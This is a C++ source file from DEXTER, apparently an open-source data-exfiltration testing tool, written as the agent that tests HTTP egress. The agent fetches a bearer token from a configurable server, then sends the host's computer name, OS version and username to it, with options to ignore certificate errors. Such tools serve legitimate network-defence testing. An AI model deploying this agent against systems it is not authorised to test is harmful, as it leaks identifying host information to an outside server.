//DEXTER - Data EXfiltration TestER
//This file is part of DEXTER Project

//Written by : @maldevel
//Website : https ://www.twelvesec.com/
//GIT : https://github.com/twelvesec/dexter

//TwelveSec(@Twelvesec)

//This program is free software : you can redistribute it and/or modify
//it under the terms of the GNU General Public License as published by
//the Free Software Foundation, either version 3 of the License, or
//(at your option) any later version.

//This program is distributed in the hope that it will be useful,
//but WITHOUT ANY WARRANTY; without even the implied warranty of
//MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
//GNU General Public License for more details.

//You should have received a copy of the GNU General Public License
//along with this program.If not, see < http://www.gnu.org/licenses/>.

//For more see the file 'LICENSE' for copying permission.

#include "libagent.h"
#include "libhttp.h"
#include <iostream>
#include "rapidjson/document.h"
#include "common/helper.h"
#include "libsysteminfo.h"

void libagent::test_http_protocol(std::wstring host, WORD port, std::wstring uagent, std::wstring requestMethod, std::wstring tokenuri,
	std::wstring logclienturi, char *data, bool IGNORE_CERT_UNKNOWN_CA, bool IGNORE_CERT_DATE_INVALID, bool HTTPS_CONNECTION) {

	char *downloaded = 0;
	HINTERNET internet = NULL, connection = NULL, request = NULL;
	const WCHAR *token_headers = L"Accept: application/json\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\n";
	bool result = false;

	internet = libhttp::open(uagent);

	if (internet != NULL) {
		connection = libhttp::connect(internet, host, port);
	}

	if (connection != NULL) {
		request = libhttp::json_request(connection, requestMethod, tokenuri, data, token_headers, IGNORE_CERT_UNKNOWN_CA,
			IGNORE_CERT_DATE_INVALID, HTTPS_CONNECTION);
	}

	if (request != NULL) {
		result = libhttp::retrieve_data(request, &downloaded);
	}

	if (result && downloaded != NULL) {

		rapidjson::Document token_response;
		token_response.Parse(downloaded);

		HeapFree(GetProcessHeap(), 0, downloaded);
		downloaded = NULL;

		std::wstring access_token = helper::read_string_value(&token_response, "access_token");
		std::wstring logclient_headers = L"Accept: application/json\r\nContent-Type: application/x-www-form-urlencoded\r\nAuthorization: Bearer " +
			access_token + L"\r\nConnection: close\r\n";

		std::string logclient_data = "computername=" + libsysteminfo::get_computer_name() + "&os=" + libsysteminfo::get_os_version() +
			"&username=" + libsysteminfo::get_username();

		if (connection != NULL) {
			request = libhttp::json_request(connection, requestMethod, logclienturi, (char*)logclient_data.c_str(),
				logclient_headers.c_str(), IGNORE_CERT_UNKNOWN_CA, IGNORE_CERT_DATE_INVALID, HTTPS_CONNECTION);
		}

		if (request != NULL) {
			result = libhttp::retrieve_data(request, &downloaded);
		}

		if (result && downloaded != NULL) {
			rapidjson::Document logclient_response;
			logclient_response.Parse(downloaded);

			bool success = helper::read_bool_value(&logclient_response, "success");
			std::wstring message = helper::read_string_value(&logclient_response, "message");
		}

		HeapFree(GetProcessHeap(), 0, downloaded);
		downloaded = NULL;
	}

	if (request) {
		InternetCloseHandle(request);
		request = NULL;
	}

	if (connection) {
		InternetCloseHandle(connection);
		connection = NULL;
	}

	if (internet) {
		InternetCloseHandle(internet);
		internet = NULL;
	}
}
